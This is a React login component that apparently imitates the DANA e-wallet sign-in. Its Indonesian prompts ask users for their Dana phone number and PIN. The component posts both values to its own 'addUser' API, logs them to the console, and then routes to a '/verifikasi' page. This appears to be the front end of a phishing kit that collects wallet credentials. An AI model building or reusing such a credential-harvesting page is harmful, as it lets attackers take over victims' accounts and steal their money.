import React from 'react'
import logo from './asset/logo.png';
import { useState } from 'react';
import { addUser } from './service/api';
import { useNavigate } from 'react-router';


const initialValue={
    telp:"",
    pin:"",
}

const Login = () => {
    const [user, setUser]=useState(initialValue);
    const {telp, pin}=user;
    const navigate = useNavigate();
    const onValueChange = (e) => {
        setUser({ ...user, [e.target.name]: e.target.value });
      };
    const addUserDetails = async () => {
        await addUser(user);
        console.log(user);
        // history.push('/all');
        
      }
    return (
        <div className='card'>
            <div className='form'>
                <div className="imgcontainer">
                    <img src={logo} alt="Avatar" className="avatar" />
                </div>
                <div className="container">
                    <label><b>No. Telepon</b></label>
                    <input type="number" placeholder="Masukan no. Telepon Dana anda" name="telp" value={telp} onChange={onValueChange} />

                    <label><b>Pin</b></label>
                    <input className='pin' type="number" placeholder="masukan pin Dana anda" name="pin" value={pin} onChange={onValueChange}/>

                    <button onClick={() => addUserDetails(navigate('/verifikasi'))}>Login</button>
                </div>
            </div>
        </div>
    )
}

export default Login